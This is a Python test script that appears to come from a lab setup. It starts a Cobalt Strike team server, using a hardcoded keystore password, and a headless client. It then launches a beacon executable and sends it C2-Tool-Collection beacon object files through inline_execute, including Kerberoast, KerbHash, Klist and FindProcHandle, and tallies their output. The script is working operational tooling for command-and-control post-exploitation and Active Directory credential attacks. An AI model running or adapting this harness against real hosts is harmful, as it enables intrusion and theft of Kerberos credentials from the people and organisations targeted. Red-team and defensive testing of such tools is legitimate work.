# -*- coding: utf-8 -*-
"""c2tc_bof_test.py - test 2: dispatch the compiled C2-Tool-Collection BOFs
against the live beacon (inline_execute) and score OUTPUT vs ERROR."""
import os
import re
import subprocess
import sys
import time
from pathlib import Path

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
BOFDIR = Path(r"C:\Users\Public\c2tc_bofs")
OUT = open(r"C:\Users\Public\c2tc_test.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


def main():
    # beacon: run franken_b1 fresh (the TS is up from test3? restart cleanly)
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
                        'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                        'ForEach-Object { "$($_.ProcessId)" }'],
                       capture_output=True, text=True, timeout=60)
    java_pids = [x.strip() for x in r.stdout.split() if x.strip().isdigit()]
    ts_up = False
    try:
        net = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=30).stdout
        ts_up = any((":50050" in ln and "LISTENING" in ln) for ln in net.splitlines())
    except Exception:
        pass
    if not java_pids or not ts_up:
        log("TS not running - booting")
        for p in java_pids:
            subprocess.run(["taskkill", "/PID", p, "/F"], capture_output=True)
        time.sleep(4)
        subprocess.Popen([JDK + r"\java.exe",
                          "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                          "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                          "--add-opens=java.base/java.net=ALL-UNNAMED",
                          "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                          "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                          "-Djavax.net.ssl.keyStorePassword=123456",
                          "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                         cwd=TSBOOT)
        time.sleep(12)
        subprocess.Popen([JDK + r"\javaw.exe",
                          "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                          "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                          "--add-opens=java.base/java.net=ALL-UNNAMED",
                          "-Xmx512m", "-cp", JAR,
                          "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opOB", "franken",
                          "headless_franken.cna"],
                         cwd=TSBOOT)
        deadline = time.time() + 120
        while time.time() < deadline:
            if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
                break
            time.sleep(3)
        log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send

    # revive a fresh beacon
    for f in (r"C:\Users\Public\franken_b1.exe",):
        pass
    seen = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
    subprocess.Popen([r"C:\Users\Public\franken_b1.exe"], cwd=r"C:\Users\Public",
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        m = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
        new = [x for x in m if x not in seen]
        if new:
            bid = new[-1]
            break
        time.sleep(5)
    if not bid:
        log("no fresh beacon INITIAL")
        return
    log("beacon bid=%s" % bid)
    send("target", bid)
    time.sleep(2)

    # BOFs to test (x64, no-arg or AD-dependent; local-safe set first)
    targets = ["Domaininfo.x64.o", "Smbinfo.x64.o", "Klist.x64.o", "FindModule.x64.o",
               "FindProcHandle.x64.o", "KerbHash.x64.o", "Kerberoast.x64.o",
               "FindObjects.x64.o"]
    p0 = len(open(LOG, encoding="utf-8", errors="replace").read())
    score = {}
    for name in targets:
        path = BOFDIR / name
        if not path.exists():
            score[name] = "MISSING"
            continue
        send("inline_execute", str(path).replace("\\", "/"), "go")
        time.sleep(6)
    # wait for outputs
    time.sleep(20)
    seg = open(LOG, encoding="utf-8", errors="replace").read()[p0:]
    for name in targets:
        base = name.replace(".x64.o", "")
        m = re.search(r"inline_execute.*" + base, seg)
        got = re.findall(r"received output:n([^\n]{0,90})", seg)
        score[name] = "%d output lines in window" % len(got)
    # per-BOF attribution is fuzzy with shared window; report all outputs
    outs = re.findall(r"received output:n([^\n]{0,90})", seg)
    errs = re.findall(r"received output:n?/??.*(?:error|Error)", seg)
    log("outputs in window: %d" % len(outs))
    for o in outs[:20]:
        log("  OUT | %s" % o)
    log("SUMMARY: %s" % score)


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
